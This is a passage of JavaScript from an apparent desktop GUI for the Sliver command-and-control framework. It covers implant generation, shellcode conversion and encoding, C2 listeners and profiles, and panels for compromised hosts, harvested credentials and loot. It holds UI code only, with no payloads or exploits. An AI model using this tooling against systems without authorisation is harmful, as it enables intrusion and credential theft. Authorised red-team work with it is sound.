      case 'wg-unique-ip': { const ip = await App().GenerateUniqueWGIP(); return appendServer(`[+] unique WG IP: ${ip}`, 'out'); }
      case 'dll2shellcode': case 'srdi': {
        if (args.length < 2) return appendServer('usage: dll2shellcode <local.dll> <function> [args]', 'err');
        const p = await App().ConvertDLLToShellcode(args[0], args[1], args.slice(2).join(' '));
        return appendServer(`[+] shellcode saved to ${p}`, 'out');
      }
      case 'shellcode-encode': {
        if (!args[0]) return appendServer('usage: shellcode-encode <local.bin> [arch=amd64] [iterations=1]', 'err');
        const p = await App().EncodeShellcode(args[0], args[1]||'amd64', parseInt(args[2])||1);
        return appendServer(`[+] encoded shellcode saved to ${p}`, 'out');
      }
      case 'c2profile': {
        if (args[0] === 'edit') { if (!args[1]) return appendServer('usage: c2profile edit <name>', 'err'); openC2Editor(args[1]); return appendServer(`[*] editing HTTP C2 profile ${args[1]}`, 'info'); }
        if (args[0] === 'new')  { openC2Editor(''); return appendServer('[*] new HTTP C2 profile editor opened', 'info'); }
        if (!args[0]) return appendServer('usage: c2profile <name> | edit <name> | new   (view/edit HTTP C2 profiles)', 'err');
        const j = await App().GetHTTPC2Profile(args[0]); return appendServer(j, 'out');
      }
      case 'website': {
        const sub = (args[0]||'').toLowerCase();
        if (sub === 'add') { if (args.length < 4) return appendServer('usage: website add <site> <web-path> <local-file>', 'err'); await App().AddWebsiteContent(args[1], args[2], args[3]); return appendServer('[+] content added', 'out'); }
        if (sub === 'update') { if (args.length < 4) return appendServer('usage: website update <site> <web-path> <local-file>', 'err'); await App().UpdateWebsiteContent(args[1], args[2], args[3]); return appendServer('[+] content updated', 'out'); }
        if (sub === 'rm')  { if (args.length < 3) return appendServer('usage: website rm <site> <web-path>', 'err'); await App().RemoveWebsiteContent(args[1], args[2]); return appendServer('[+] content removed', 'out'); }
        const w = await App().ListWebsites(); if (!w || !w.length) return appendServer('no websites', 'info');
        return appendServer(w.map(x => x.name).join('\n'), 'out');
      }
      case 'hosts': {
        if (args[0] === 'rm') { await App().DeleteHost(args[1]); return appendServer(`[+] host ${args[1]} removed`, 'out'); }
        if (args[0] === 'ioc-rm') { if (!args[1]) return appendServer('usage: hosts ioc-rm <ioc-id> [path] [filehash]', 'err'); await App().RemoveHostIOC(args[1], args[2]||'', args[3]||''); return appendServer('[+] host IOC removed', 'out'); }
        const h = await App().ListHosts(); if (!h.length) return appendServer('no hosts in the database', 'info');
        let o = 'HOSTNAME             OS                             UUID\n';
        h.forEach(x => o += `${(x.hostname||'').slice(0,20).padEnd(21)}${(x.os||'').slice(0,30).padEnd(31)}${(x.uuid||'').slice(0,12)}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'creds': {
        if (args[0] === 'add') { if (args.length < 3) return appendServer('usage: creds add <username> <password>', 'err'); await App().AddCred(args[1], args[2], ''); return appendServer('[+] credential added', 'out'); }
        if (args[0] === 'rm') { await App().DeleteCred(args[1]); return appendServer(`[+] credential ${args[1]} removed`, 'out'); }
        if (args[0] === 'update') { if (args.length < 3) return appendServer('usage: creds update <id> <plaintext>', 'err'); await App().UpdateCredential(args[1], '', args[2], '', true); return appendServer('[+] credential updated', 'out'); }
        if (args[0] === 'sniff') { if (!args[1]) return appendServer('usage: creds sniff <hash>', 'err'); const ht = await App().SniffCredHashType(args[1]); return appendServer(`hash type: ${ht}`, 'out'); }
        if (args[0] === 'get') { if (!args[1]) return appendServer('usage: creds get <id>', 'err'); const c = await App().GetCredential(args[1]); return appendServer(`ID:        ${c.id}\nUsername:  ${c.username}\nPlaintext: ${c.plaintext}\nHash:      ${c.hash}\nCracked:   ${c.cracked}`, 'out'); }
        const c = await App().ListCreds(); if (!c.length) return appendServer('no credentials stored', 'info');
        let o = 'USERNAME             PLAINTEXT / HASH\n';
        c.forEach(x => o += `${(x.username||'').slice(0,20).padEnd(21)}${x.plaintext || x.hash || ''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'regenerate': { if (!args[0]) return appendServer('usage: regenerate <build-name>', 'err'); const r = await App().RegenerateBuild(args[0]); return appendServer(r.error ? `[error] ${r.error}` : `[+] saved ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out'); }
      case 'websites': {
        if (args[0] === 'rm') { await App().RemoveWebsite(args[1]); return appendServer(`[+] website ${args[1]} removed`, 'out'); }
        const w = await App().ListWebsites(); if (!w.length) return appendServer('no websites', 'info');
        return appendServer(w.map(x => `${(x.name||'').padEnd(20)} ${x.paths} path(s)`).join('\n'), 'out');
      }
      case 'canaries': {
        const c = await App().ListCanaries(); if (!c.length) return appendServer('no canaries', 'info');
        let o = 'DOMAIN                         IMPLANT              TRIGGERED  COUNT\n';
        c.forEach(x => o += `${(x.domain||'').slice(0,30).padEnd(31)}${(x.implantName||'').slice(0,20).padEnd(21)}${(x.triggered?'YES':'no').padEnd(11)}${x.count}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'stager': {
        if (args.length < 3) return appendServer('usage: stager <host> <port> <profile>', 'err');
        const jid = await App().StartStagerListener(args[0], parseInt(args[1]), args[2]).catch(e => { appendServer(`[error] ${e}`, 'err'); return null; });
        if (jid !== null) return appendServer(`[+] TCP stager listener started on ${args[0]}:${args[1]} (job ${jid})`, 'out');
        return;
      }
      default: appendServer(`unknown server command: ${cmd}  (type 'help')`, 'err');
    }
  } catch (e) { appendServer('[error] ' + e, 'err'); }
}

function openEventsPanel() {
  const content = `<div style="display:flex;justify-content:flex-end;margin-bottom:8px"><button class="btn small" onclick="pinEvents()">Pin to console</button></div><div class="event-log" data-events-list style="max-height:64vh"></div>`;
  openViewPanel('_events', 'Event Log', content);
  renderEventsList();
}
// pinEvents docks a live Event Log panel into the bottom console area.
function pinEvents() {
  hideModal();
  const id = '_events_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>Event Log</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div class="event-log" data-events-list style="flex:1"></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  renderEventsList();
}

async function openOperatorsPanel() {
  const ops = await App().ListOperators().catch(() => []);
  let rows = (ops||[]).map(o => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;border-bottom:1px solid var(--border)"><span style="color:${o.online?'var(--ok)':'var(--muted)'}">${o.online?'[online]':'[offline]'}</span><span>${esc(o.name)}</span></div>`).join('');
  if (!rows) rows = '<div style="padding:10px;color:var(--muted)">No operators.</div>';
  openViewPanel('_operators', 'Operators', `<div style="overflow:auto;flex:1">${rows}</div>`);
}

function openLootPanel() {
  openViewPanel('_loot', 'Loot', `<div style="overflow:auto;flex:1" id="loot-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
  refreshLootList();
}

// HTTP C2 profile editor — load the profile as JSON, edit, save back.
async function openC2Editor(name) {
  openViewPanel('_c2edit', `HTTP C2 Profile${name ? ' — ' + name : ''}`,
    `<div style="display:flex;flex-direction:column;gap:8px;flex:1;min-height:0">
       <p style="color:var(--muted);font-size:11px;margin:0">Edit the profile JSON below. To clone it, change the <code>"name"</code> field and click <b>Save as new</b>. Malformed JSON is rejected by the teamserver.</p>
       <textarea id="c2-json" class="notes-area" style="flex:1;min-height:260px;font-family:var(--mono);font-size:11px;line-height:1.5" spellcheck="false">Loading…</textarea>
       <div style="display:flex;gap:8px;align-items:center">
         <button id="c2-save" class="btn accent">Save (overwrite)</button>
         <button id="c2-savenew" class="btn">Save as new</button>
         <span id="c2-status" style="font-size:11px;color:var(--muted)"></span>
       </div>
     </div>`);
  const ta = document.getElementById('c2-json'), status = document.getElementById('c2-status');
  if (name) {
    try { ta.value = await App().GetHTTPC2Profile(name); }
    catch (e) { ta.value = ''; status.textContent = 'load error: ' + e; }
  } else {
    ta.value = '';
    ta.placeholder = 'Paste an HTTP C2 profile JSON (copy one from "c2profile <name>" as a starting point).';
  }
  const save = async overwrite => {
    if (!ta.value.trim()) { status.textContent = 'nothing to save'; return; }
    status.textContent = 'saving…';
    try { await App().SaveHTTPC2Profile(ta.value, overwrite); status.textContent = '✓ saved'; toast('ok', 'HTTP C2 profile saved'); }
    catch (e) { status.textContent = '✕ ' + e; toast('err', String(e)); }
  };
  document.getElementById('c2-save').addEventListener('click', () => save(true));
  document.getElementById('c2-savenew').addEventListener('click', () => save(false));
}
async function refreshLootList() {
  const el = document.getElementById('loot-list'); if (!el) return;
  const loot = await App().GetLoot().catch(() => []);
  if (!loot?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No loot.</div>'; return; }
  el.innerHTML = loot.map(l => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(l.name)}</span><span style="color:var(--muted)">${esc(l.type)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(l.id.slice(0,10))}</span><button class="btn small" onclick="lootDownload('${esc(l.id)}')">Download</button><button class="btn small danger" onclick="App().DeleteLoot('${esc(l.id)}').then(refreshLootList)">Del</button></div>`).join('');
}
async function lootDownload(lootID) {
  const r = await App().DownloadLoot(lootID).catch(e => ({ error: String(e) }));
  toast(r.error ? 'err' : 'ok', r.error ? `Loot download failed: ${r.error}` : `Saved to ${r.path}`);
}

// ── Creds panel ─────────────────────────────────────────────────────────────
function openCredsPanel() {
  const content = `<div class="panel" style="margin-bottom:12px"><h3>Add Credential</h3>
    <form id="cred-form">
      <div class="gen-row">
        <div class="gen-field"><label>Username</label><input name="username" placeholder="user"/></div>
        <div class="gen-field"><label>Password / Plaintext</label><input name="plaintext" placeholder="P@ss"/></div>
        <div class="gen-field"><label>Hash (optional)</label><input name="hash" placeholder="NTLM/hash"/></div>
      </div>
      <div class="gen-row"><button type="submit" class="btn accent" style="margin-left:auto">Add</button></div>
      <div id="cred-msg" class="status-msg"></div>
    </form></div>
    <div style="overflow:auto;flex:1" id="creds-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`;
  openViewPanel('_creds', 'Credentials', content);
  const f = document.getElementById('cred-form');
  f.addEventListener('submit', async e => {
    e.preventDefault();
    const msg = document.getElementById('cred-msg'); msg.textContent = 'Saving...'; msg.className = 'status-msg';
    const err = await App().AddCred(f.username.value, f.plaintext.value, f.hash.value).then(()=>null).catch(e=>String(e));
    if (err) { msg.textContent = err; msg.className = 'status-msg err'; }
    else { msg.textContent = 'Added'; msg.className = 'status-msg ok'; f.reset(); refreshCredsList(); }
  });
  refreshCredsList();
}
async function refreshCredsList() {
  const el = document.getElementById('creds-list'); if (!el) return;
  const creds = await App().ListCreds().catch(() => []);
  if (!creds.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No credentials stored.</div>'; return; }
  el.innerHTML = creds.map(c => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(c.username)}</span><span style="flex:1;font-family:var(--mono)">${esc(c.plaintext||c.hash||'')}</span>${c.cracked?'<span style="color:var(--ok)">cracked</span>':''}<button class="btn small danger" onclick="App().DeleteCred('${esc(c.id)}').then(refreshCredsList)">Del</button></div>`).join('');
}

// ── Hosts panel ─────────────────────────────────────────────────────────────
function openHostsPanel() {
  openViewPanel('_hosts', 'Hosts', `<div style="overflow:auto;flex:1" id="hosts-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
  refreshHostsList();
}
async function refreshHostsList() {
  const el = document.getElementById('hosts-list'); if (!el) return;
  const hosts = await App().ListHosts().catch(() => []);
  if (!hosts.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No hosts in the database.</div>'; return; }
  el.innerHTML = hosts.map(h => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(h.hostname)}</span><span style="flex:1;color:var(--muted)">${esc(h.os)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc((h.uuid||'').slice(0,8))}</span><span style="color:var(--muted)">${esc(h.firstSeen)}</span><button class="btn small danger" onclick="App().DeleteHost('${esc(h.id)}').then(refreshHostsList)">Del</button></div>`).join('');
}

function openBuildsPanel() {
  openViewPanel('_builds', 'Builds', `<div style="overflow:auto;flex:1" id="builds-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
  refreshBuildsList();
}
async function refreshBuildsList() {
  const el = document.getElementById('builds-list'); if (!el) return;
  const builds = await App().GetBuildHistory().catch(() => []);
  if (!builds?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No builds yet.</div>'; return; }
  el.innerHTML = builds.map(b => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(b.name)}</span><span style="color:var(--muted)">${esc(b.goos)}/${esc(b.goarch)}</span><span style="color:var(--muted)">${esc(b.format)}</span><span style="color:var(--muted);font-family:var(--mono);max-width:180px;overflow:hidden;text-overflow:ellipsis">${esc((b.c2Urls||[]).join(','))}</span><button class="btn small" onclick="buildRegen('${esc(b.name)}')">Download</button><button class="btn small danger" onclick="deleteBuild('${esc(b.name)}')">Del</button></div>`).join('');
}
async function deleteBuild(name) {
  if (!(await uiConfirm(`Delete build ${esc(name)}?`, { title: 'Delete build', okLabel: 'Delete', danger: true }))) return;
  await App().DeleteBuild(name)
    .then(() => { toast('ok', `Deleted build ${name}`); refreshBuildsList(); })
    .catch(e => toast('err', 'Delete failed: ' + e));
}
async function buildRegen(name) {
  const r = await App().RegenerateBuild(name).catch(e => ({ error: String(e) }));
  toast(r.error ? 'err' : 'ok', r.error ? `Regenerate failed: ${r.error}` : `Saved to ${r.path}`);
}

function profilesContent() {
  return `<div style="display:flex;justify-content:flex-end;gap:6px;margin-bottom:10px">
      <button class="btn small" onclick="pinProfiles()">📌 Pin to console</button>
    </div>
    <div class="panel" style="margin-bottom:12px">
      <h3>New Profile</h3>
      <form id="prof-form">
        <div class="gen-row">
          <div class="gen-field"><label>Name</label><input name="name" placeholder="win-mtls" required/></div>
          <div class="gen-field"><label>Format</label><select name="format"><option value="exe">Executable</option><option value="shared">Shared Lib</option><option value="service">Service</option><option value="shellcode">Shellcode</option></select></div>
        </div>
        <div class="gen-row">
          <div class="gen-field"><label>OS</label><select name="goos"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select></div>
          <div class="gen-field"><label>Arch</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
        </div>
        <div class="gen-row"><div class="gen-field" style="flex:2"><label>C2 URL</label><input name="c2Url" placeholder="mtls://ip:port" required/></div></div>
        <div class="gen-row">
          <label class="check-label"><input type="checkbox" name="debug"/> Debug</label>
          <label class="check-label"><input type="checkbox" name="beacon" id="prof-beacon"/> Beacon mode</label>
        </div>
        <div class="gen-row" id="prof-beacon-opts" style="display:none">
          <div class="gen-field"><label>Interval (s)</label><input name="interval" type="number" value="60"/></div>
          <div class="gen-field"><label>Jitter (s)</label><input name="jitter" type="number" value="30"/></div>
        </div>
        <div class="gen-row"><button type="submit" class="btn accent" style="margin-left:auto">Save Profile</button></div>
        <div id="prof-msg" class="status-msg"></div>
      </form>
    </div>
    <div style="overflow:auto;flex:1" data-profiles-list><div style="padding:10px;color:var(--muted)">Loading...</div></div>`;
}
function openProfilesPanel() {
  openViewPanel('_profiles', 'Profiles', profilesContent());
  wireProfileForm();
  refreshProfilesList();
}
function wireProfileForm() {
  const f = document.getElementById('prof-form'); if (!f) return;
  document.getElementById('prof-beacon')?.addEventListener('change', function() {
    document.getElementById('prof-beacon-opts').style.display = this.checked ? 'flex' : 'none';
  });
  f.addEventListener('submit', async e => {
    e.preventDefault();
    const req = { name:f.name.value, goos:f.goos.value, goarch:f.goarch.value, format:f.format.value, c2Url:f.c2Url.value, debug:f.debug.checked, beacon:f.beacon.checked, interval:parseInt(f.interval?.value)||60, jitter:parseInt(f.jitter?.value)||0 };
    const msg = document.getElementById('prof-msg');
    msg.textContent = 'Saving...'; msg.className = 'status-msg';
    const r = await App().SaveImplantProfile(req).catch(e => String(e));
    if (r) { msg.textContent = String(r); msg.className = 'status-msg err'; }
    else { msg.textContent = 'Profile saved'; msg.className = 'status-msg ok'; f.reset(); refreshProfilesList(); }
  });
}
async function refreshProfilesList() {
  const targets = document.querySelectorAll('[data-profiles-list]');
  if (!targets.length) return;
  const profs = await App().ListImplantProfiles().catch(() => []);
  const html = !profs?.length
    ? '<div style="padding:10px;color:var(--muted)">No saved profiles yet — create one above.</div>'
    : profs.map(p => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(p.name)}</span><span style="color:var(--muted)">${esc(p.goos)}/${esc(p.goarch)}</span><span style="color:var(--muted)">${esc(p.format)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(p.c2Url||'')}</span><button class="btn small" onclick='genFromProfile(${JSON.stringify(p)})'>Generate</button><button class="btn small danger" onclick="App().DeleteImplantProfile('${esc(p.name)}').then(refreshProfilesList)">Del</button></div>`).join('');
  targets.forEach(el => el.innerHTML = html);
}
// pinProfiles docks a live profiles list into the bottom console.
function pinProfiles() {
  hideModal();
  const id = '_profiles_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>📦 Profiles</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1" data-profiles-list></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  refreshProfilesList();
}
// genFromProfile pre-fills the Generate form from a saved profile.
function genFromProfile(p) {
  closeTab('_generate');
  openGeneratePanel();
  setTimeout(() => {
    const f = document.getElementById('gen-form'); if (!f) return;
    if (p.goos) f.goos.value = p.goos;
    if (p.goarch) f.goarch.value = p.goarch;
    if (p.format) f.format.value = p.format;
    if (p.c2Url) f.c2Url.value = p.c2Url;
    f.debug.checked = !!p.debug;
    if (p.beacon) {
      f.beacon.checked = true;
      document.getElementById('gbeacon-opts').style.display = 'flex';
      if (f.interval) f.interval.value = p.interval || 60;
      if (f.jitter) f.jitter.value = p.jitter || 0;
    }
  }, 30);
}

function openListenersPanel() {
  const content = `<div class="listener-layout">
    <div class="panel"><h3>Start Listener</h3>
      <div class="field-row"><label>Type</label><select id="ls-type"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option></select></div>
      <div class="field-row"><label>Host</label><input id="ls-host" value="0.0.0.0"/></div>
      <div class="field-row"><label>Port</label><input id="ls-port" type="number" value="8443"/></div>
      <button class="btn accent" id="ls-start" style="width:100%;margin-top:6px">Start</button>
      <div id="ls-msg" class="status-msg"></div>
    </div>
    <div class="panel"><h3>Active Listeners</h3><div id="ls-list"></div></div>
  </div>`;
  openViewPanel('_listeners', 'Listeners', content);
  setTimeout(wireListeners, 0);
}
async function wireListeners() {
  const startBtn = document.getElementById('ls-start'); if (!startBtn) return;
  startBtn.addEventListener('click', async () => {
    const type = document.getElementById('ls-type').value;
    const host = document.getElementById('ls-host').value.trim()||'0.0.0.0';
    const port = parseInt(document.getElementById('ls-port').value)||8443;
    const msg = document.getElementById('ls-msg');
    msg.textContent = 'Starting...'; msg.className = 'status-msg';
    try {
      if (type==='mtls') await App().StartMTLSListener({host,port});
      else if (type==='https') await App().StartHTTPListener({host,port,secure:true});
      else if (type==='http') await App().StartHTTPListener({host,port,secure:false});
      else if (type==='dns') await App().StartDNSListener({domains:[host]});
      msg.textContent = `${type.toUpperCase()} started on :${port}`; msg.className = 'status-msg ok';
    } catch(e) { msg.textContent = String(e); msg.className = 'status-msg err'; }
    refreshListenerList();
  });
  refreshListenerList();
}
async function refreshListenerList() {
  const el = document.getElementById('ls-list'); if (!el) return;
  const jobs = await App().ListJobs().catch(() => []);
  if (!jobs?.length) { el.innerHTML = '<div style="color:var(--muted);font-size:12px">None active</div>'; return; }
  el.innerHTML = jobs.map(j => `<div style="padding:4px 0;font-size:12.5px;display:flex;justify-content:space-between;border-bottom:1px solid var(--border)"><span>${esc(j.name)} (${esc(j.protocol)} :${j.port})</span><button class="btn small danger" onclick="App().KillJob(${j.id}).then(refreshListenerList)">Kill</button></div>`).join('');
}

function openGeneratePanel() {
  const content = `<form id="gen-form" class="gen-form">
    <div class="gen-row">
      <div class="gen-field"><label>Name (optional)</label><input name="name" placeholder="auto"/></div>
      <div class="gen-field"><label>Format</label><select name="format"><option value="exe">Executable</option><option value="shared">Shared Lib</option><option value="service">Service</option><option value="shellcode">Shellcode</option></select></div>
    </div>
    <div class="gen-row">
      <div class="gen-field"><label>OS</label><select name="goos"><option value="windows">Windows</option><option value="linux">Linux</option><option value="darwin">macOS</option></select></div>
      <div class="gen-field"><label>Arch</label><select name="goarch"><option value="amd64">amd64</option><option value="386">386</option><option value="arm64">arm64</option></select></div>
    </div>
    <div class="gen-row"><div class="gen-field" style="flex:2"><label>From Listener</label><select id="gen-listener"><option value="">- select an active listener -</option></select></div></div>
    <div class="gen-row"><div class="gen-field" style="flex:2"><label>C2 URL</label><input name="c2Url" placeholder="mtls://ip:port or https://ip:port" required/></div></div>
    <div class="gen-row">
      <label class="check-label"><input type="checkbox" name="debug"/> Debug</label>
      <label class="check-label"><input type="checkbox" name="beacon" id="gbeacon"/> Beacon mode</label>
    </div>
    <div class="gen-row" id="gbeacon-opts" style="display:none">
      <div class="gen-field"><label>Interval (s)</label><input name="interval" type="number" value="60"/></div>
      <div class="gen-field"><label>Jitter (s)</label><input name="jitter" type="number" value="30"/></div>
    </div>
    <button type="submit" class="btn accent">Generate</button>
    <div id="gen-status" class="gen-status" style="display:none"><div class="spinner"></div><span>Building...</span></div>
    <div id="gen-result" class="result-box"></div>
  </form>`;
  openViewPanel('_generate', 'Generate', content);
  setTimeout(async () => {
    document.getElementById('gbeacon')?.addEventListener('change', function() {
      document.getElementById('gbeacon-opts').style.display = this.checked ? 'flex' : 'none';
    });
    // Populate "From Listener" dropdown; auto-fill C2 URL from the first one.
    const sel = document.getElementById('gen-listener');
    const c2 = document.querySelector('#gen-form [name="c2Url"]');
    const urls = await App().ListenerC2Options().catch(() => []);
    if (sel) {
      sel.innerHTML = urls.length
        ? '<option value="">- select an active listener -</option>' + urls.map(u => `<option value="${esc(u)}">${esc(u)}</option>`).join('')
        : '<option value="">- no active listeners -</option>';
      if (urls.length && c2 && !c2.value.trim()) { sel.value = urls[0]; c2.value = urls[0]; }
      sel.addEventListener('change', () => { if (sel.value && c2) c2.value = sel.value; });
    }
    document.getElementById('gen-form')?.addEventListener('submit', async e => {
      e.preventDefault(); const f = e.target;
      const req = { name:f.name.value, goos:f.goos.value, goarch:f.goarch.value, format:f.format.value, c2Url:f.c2Url.value, debug:f.debug.checked, beacon:f.beacon.checked, interval:parseInt(f.interval?.value)||60, jitter:parseInt(f.jitter?.value)||0 };
      document.getElementById('gen-status').style.display = 'flex';
      document.getElementById('gen-result').textContent = '';
      const r = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
      document.getElementById('gen-status').style.display = 'none';
      const res = document.getElementById('gen-result');
      if (r.error) {
        res.textContent = `[ERROR] ${r.error}`;
        res.style.color = 'var(--accent)';
      } else {
        res.style.color = 'var(--ok)';
        res.innerHTML = `<span>[OK] Build created: ${esc(r.name || r.file)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(r.name || r.file)}')">⬇ Save to disk</button>`;
        // Auto-trigger the native save dialog immediately
        buildRegen(r.name || r.file);
      }
    });
  }, 0);
}
// ── Command palette (Ctrl+K) ─────────────────────────────────────────────────
let paletteItems = [], paletteSel = 0;
document.addEventListener('keydown', e => {
  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openPalette(); }
});
function openPalette() {
  if (document.getElementById('app-shell').classList.contains('hidden')) return; // not connected
  const ov = document.getElementById('palette-overlay');
  ov.classList.remove('hidden');
  const inp = document.getElementById('palette-input');
  inp.value = ''; buildPalette('');
  setTimeout(() => inp.focus(), 20);
}
function closePalette() { document.getElementById('palette-overlay').classList.add('hidden'); }
function buildPalette(q) {
  q = q.toLowerCase();
  const panels = ['sessions','beacons','listeners','generate','builds','profiles','events','loot','operators'];
  const items = [];
  [...allSessions.map(s => ({ kind:'session', obj:s })), ...allBeacons.map(b => ({ kind:'beacon', obj:b }))].forEach(a => {
    const label = `${a.kind==='session'?'💻':'📡'} ${a.obj.hostname||a.obj.id.slice(0,8)} — ${a.obj.username||''}`;
    if (!q || label.toLowerCase().includes(q)) items.push({ label, action: () => { switchView('sessions'); openInteract(a.kind, a.obj); } });
  });
  panels.forEach(p => { if (!q || p.includes(q)) items.push({ label: `⚙ ${p}`, action: () => { const b = document.querySelector(`.tb-btn[data-view="${p}"]`); if (b) b.click(); } }); });
  paletteItems = items; paletteSel = 0; renderPalette();
}
function renderPalette() {
  const el = document.getElementById('palette-results');
  if (!paletteItems.length) { el.innerHTML = '<div class="palette-empty">No matches</div>'; return; }
  el.innerHTML = paletteItems.map((it,i) => `<div class="palette-item${i===paletteSel?' active':''}" data-i="${i}">${esc(it.label)}</div>`).join('');
  el.querySelectorAll('.palette-item').forEach(d => d.addEventListener('click', () => { paletteItems[parseInt(d.dataset.i)].action(); closePalette(); }));
}
document.getElementById('palette-input').addEventListener('input', function(){ buildPalette(this.value); });
document.getElementById('palette-input').addEventListener('keydown', e => {
  if (e.key === 'Escape') return closePalette();
  if (e.key === 'ArrowDown') { paletteSel = Math.min(paletteSel+1, paletteItems.length-1); renderPalette(); e.preventDefault(); }
  if (e.key === 'ArrowUp')   { paletteSel = Math.max(paletteSel-1, 0); renderPalette(); e.preventDefault(); }
  if (e.key === 'Enter' && paletteItems[paletteSel]) { paletteItems[paletteSel].action(); closePalette(); }
});
document.getElementById('palette-overlay').addEventListener('click', e => { if (e.target.id === 'palette-overlay') closePalette(); });
function switchView(v) { const b = document.querySelector(`.tb-btn[data-view="${v}"]`); if (b && v !== 'sessions') b.click(); }

// ── Resize handle ──────────────────────────────────────────────────────────
(function() {
  const handle = document.getElementById('resize-handle');
  const top = document.getElementById('top-panel');
  const bot = document.getElementById('bottom-panel');
  let dragging = false, startY = 0, startH = 0;
  handle.addEventListener('mousedown', e => { dragging = true; startY = e.clientY; startH = bot.offsetHeight; document.body.style.cursor = 'row-resize'; e.preventDefault(); });
  document.addEventListener('mousemove', e => { if (!dragging) return; const dy = startY - e.clientY; bot.style.height = Math.max(80, startH + dy) + 'px'; });
  document.addEventListener('mouseup', () => { if (dragging) { dragging = false; document.body.style.cursor = ''; } });
})();

// ── Auto-reconnect ─────────────────────────────────────────────────────────
function onDisconnected(reason) {
  if (reconnecting) return;
  reconnecting = true; clearInterval(pollTimer);
  document.getElementById('reconnect-overlay').classList.remove('hidden');
  document.getElementById('reconnect-status').textContent = reason || 'Connection lost';
  startReconnect();
}
function startReconnect() {
  let n = 10;
  document.getElementById('reconnect-count').textContent = n;
  clearInterval(reconnectTimer);
  reconnectTimer = setInterval(() => { n--; document.getElementById('reconnect-count').textContent = n; if (n <= 0) attemptReconnect(); }, 1000);
}
async function attemptReconnect() {
  if (!lastConfigPath) { cancelReconnect(); return; }
  clearInterval(reconnectTimer);
  document.getElementById('reconnect-status').textContent = 'Reconnecting...';
  const r = await App().Connect(lastConfigPath).catch(e => ({error:String(e)}));
  if (r && r.connected) { reconnecting = false; document.getElementById('reconnect-overlay').classList.add('hidden'); wireEventStream(); refreshAgents(); pollTimer = setInterval(refreshAgents, 5000); toast('ok','Reconnected'); }
  else { document.getElementById('reconnect-status').textContent = r?.error||'Failed'; startReconnect(); }
}
function cancelReconnect() { reconnecting = false; clearInterval(reconnectTimer); document.getElementById('reconnect-overlay').classList.add('hidden'); }
document.getElementById('reconnect-now-btn').addEventListener('click', attemptReconnect);
document.getElementById('reconnect-cancel-btn').addEventListener('click', async () => { cancelReconnect(); await App().Disconnect().catch(()=>{}); document.getElementById('disconnect-btn').click(); });

// Show GUI build version on the connect screen once the Wails runtime is ready.
(async function showGuiVersion() {
  let bi = null;
  try { bi = await App().AppVersion(); } catch (e) { /* runtime not ready or older backend */ }
  const el = document.getElementById('gui-version');
  if (el) {
    el.textContent = bi && bi.version ? `${bi.version} · ${bi.gitCommit}` : '';
    el.title = bi ? `Built ${bi.buildDate}` : '';
  }
  const wm = document.getElementById('panel-watermark');
  if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''} · Made by Raj Kumar Mullapudi`;
})();



// ── File Browser Panel ───────────────────────────────────────────────────────
async function openFileBrowser(sessionID) {
  const dockId = `files-${sessionID}`;
  if (openTabs[dockId]) { activateTab(dockId); return; }
  openTabs[dockId] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();

  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
